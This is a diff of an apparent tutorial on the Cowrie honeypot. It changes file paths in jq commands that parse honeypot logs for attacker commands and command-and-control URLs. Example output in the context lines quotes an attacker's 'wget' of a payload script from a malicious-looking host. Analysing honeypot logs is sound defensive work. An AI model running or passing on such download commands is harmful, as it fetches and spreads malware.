@@ -798,7 +798,7 @@ source cowrie-env/bin/activate
 pip install cowrie                        # => Installs Cowrie and dependencies
 # => Cowrie simulates: SSH/Telnet login, fake filesystem, command execution recording
 
-# Configure Cowrie (/home/cowrie/cowrie/etc/cowrie.cfg)
+# Configure Cowrie (~cowrie/cowrie/etc/cowrie.cfg)
 ```
 
 ```ini
@@ -834,7 +834,7 @@ cowrie start                              # => Daemonizes; logs to var/log/cowri
 # === Log analysis after attack sessions ===
 # Parse JSON log to extract commands attackers ran
 jq -r 'select(.eventid=="cowrie.command.input") | "\(.src_ip) \(.input)"' \
-  /home/cowrie/var/log/cowrie/cowrie.json \
+  ~cowrie/var/log/cowrie/cowrie.json \
   | sort | uniq -c | sort -rn | head -20
 # => Output (example):
 #  47 185.220.101.5  wget http://malc2.ru/payload.sh
@@ -845,7 +845,7 @@ jq -r 'select(.eventid=="cowrie.command.input") | "\(.src_ip) \(.input)"' \
 
 # Extract unique C2 URLs from download commands
 jq -r 'select(.eventid=="cowrie.command.input") | .input' \
-  /home/cowrie/var/log/cowrie/cowrie.json \
+  ~cowrie/var/log/cowrie/cowrie.json \
   | grep -oP '(https?://[^\s]+)' \
   | sort -u
 # => Lists malware download URLs for threat intelligence feeds and blocking
